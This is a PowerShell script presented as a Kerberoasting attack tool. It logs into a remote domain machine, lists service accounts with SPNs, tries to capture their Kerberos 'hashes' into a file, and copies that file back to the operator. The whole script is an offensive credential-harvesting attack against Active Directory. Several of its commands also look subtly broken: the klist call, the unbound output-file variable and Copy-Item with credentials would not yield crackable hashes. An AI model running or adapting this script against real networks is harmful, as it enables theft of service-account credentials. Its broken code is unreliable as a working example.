# Kerberoasting attack script for remote execution in PowerShell

param(
    [string]$RemoteComputerName,
    [string]$Username,
    [string]$Password,
    [string]$OutputFile = "kerberoast_hashes.txt"
)

$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($Username, $SecurePassword)

$Session = New-PSSession -ComputerName $RemoteComputerName -Credential $Cred

Invoke-Command -Session $Session -ScriptBlock {
    Import-Module ActiveDirectory

    function Get-KerberoastHashes {
        param(
            [string]$OutputFile = "C:\Temp\kerberoast_hashes.txt"
        )

        $ServiceAccounts = Get-ADUser -Filter { ServicePrincipalName -ne "$null" } -Properties ServicePrincipalName | Where-Object { $_.ServicePrincipalName -ne $null }

        foreach ($Account in $ServiceAccounts) {
            $SPNs = $Account.ServicePrincipalName
            foreach ($SPN in $SPNs) {
                try {
                    # Requesting a Kerberos ticket
                    $Ticket = Invoke-Expression "klist tgt /ticket:$SPN"
                    $Hash = $Ticket | Out-String
                    Add-Content -Path $OutputFile -Value $Hash
                    Write-Host "Captured hash for SPN: $SPN"
                } catch {
                    Write-Host "Failed to capture hash for SPN: $SPN" -ForegroundColor Red
                }
            }
        }
        Write-Host "Kerberoasting completed. Hashes saved to $OutputFile"
    }

    # Run the function to get Kerberoast hashes
    Get-KerberoastHashes -OutputFile "C:\Temp\$OutputFile"
} -ArgumentList $OutputFile

Copy-Item -Path "\\$RemoteComputerName\C$\Temp\$OutputFile" -Destination ".\$OutputFile" -Credential $Cred

Remove-PSSession -Session $Session

Write-Host "Hashes retrieved and saved to $OutputFile"
